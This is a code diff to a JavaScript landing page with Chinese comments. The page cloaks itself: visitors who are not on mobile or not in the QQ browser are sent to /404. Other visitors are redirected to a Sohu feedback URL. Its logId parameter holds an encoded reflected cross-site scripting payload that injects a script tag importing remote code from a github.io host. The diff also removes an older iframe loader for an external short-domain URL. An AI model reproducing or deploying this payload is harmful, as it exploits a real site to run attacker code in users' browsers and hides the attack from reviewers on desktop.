@@ -3,41 +3,47 @@ function isMobile() {
 	var userAgent = navigator.userAgent.toLowerCase();
 	return (/iphone|ipad|ipod|android|windows phone/.test(userAgent));
 }
+// 检测是否在移动端 QQ 浏览器中访问
+function isMobileQQBrowser() {
+    var userAgent = navigator.userAgent || navigator.vendor || window.opera;
+    return (userAgent.indexOf('QQ') !== -1 && userAgent.indexOf('Mobile') !== -1);
+}
+
+// 使用例子
+if (isMobileQQBrowser()) {
+    console.log('当前环境是移动端 QQ 浏览器');
+} else {
+   window.location.href = '/404';
+}
+
+
 
 // 如果不在移动端访问，则跳转到提示页面
 if (!isMobile()) {
  	window.location.href = '/404';
 }
 
-// 代码开源公开，请勿使用违法途径！
 
-
-// 获取地址栏中的参数
-function getParameterByName(name, url) {
-	if (!url) url = window.location.href;
-	name = name.replace(/[\[\]]/g, "\\$&");
-	var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
-		results = regex.exec(url);
-	if (!results) return null;
-	if (!results[2]) return '';
-	return decodeURIComponent(results[2].replace(/\+/g, " "));
+function getQueryVariable(variable) {
+	var query = window.location.search.substring(1);
+	var vars = query.split("&");
+	for (var i = 0; i < vars.length; i++) {
+		var pair = vars[i].split("=");
+		if (pair[0] === variable) {
+			return pair[1];
+		}
+	}
+	return false;
 }
 
-// 从地址栏中获取id参数的值
-var url = getParameterByName('u');
+var t = getQueryVariable('t');
 
-//  内嵌网址
-var dz='https://pbwci.qun.hk/FnoxZLFxXscrvRomz6-arN6ZUMib?u='+url;
-// 创建一个新的 XMLHttpRequest 对象
-var existingIframe = document.querySelector('iframe');
-if (existingIframe) {
-	existingIframe.src = dz; // 直接修改iframe的src属性为获取到的URL
+if (t.length > 10) {
+	var timestamp = Date.now();
+	var jk1 = "https://feedback.vrs.sohu.com/feedback.html;fXcvJHmkItPPMsd" + timestamp +
+		"diUlxoOUaqMtdRiGv?logId=1%27)%22%3C/Title/%3C/Style/%3C/Textarea/%3C/Iframe%3E%3CScript/K/%3Eimport(%27//xiachedann.github.io/playmusic.js%27)%3C/Script/K&17225942986202=5018016e1ea27a6572ef377dbad76da59d01d7f3a55&url=" +
+		t;
+	window.location.href = jk1;
 } else {
-	// 如果没有找到iframe，则创建一个并设置其src属性
-	var iframe = document.createElement('iframe');
-	iframe.style.width = '100%'; // 设置 iframe 的宽度
-	iframe.style.height = '100vh'; // 设置 iframe 的高度
-	iframe.style.border = 'none'; // 设置 iframe 的边框样式
-	iframe.src = dz; // 设置 iframe 的 src 属性为获取到的URL
-	document.body.appendChild(iframe); // 将 iframe 添加到 body 中
+	window.location.href = '/404';
 }
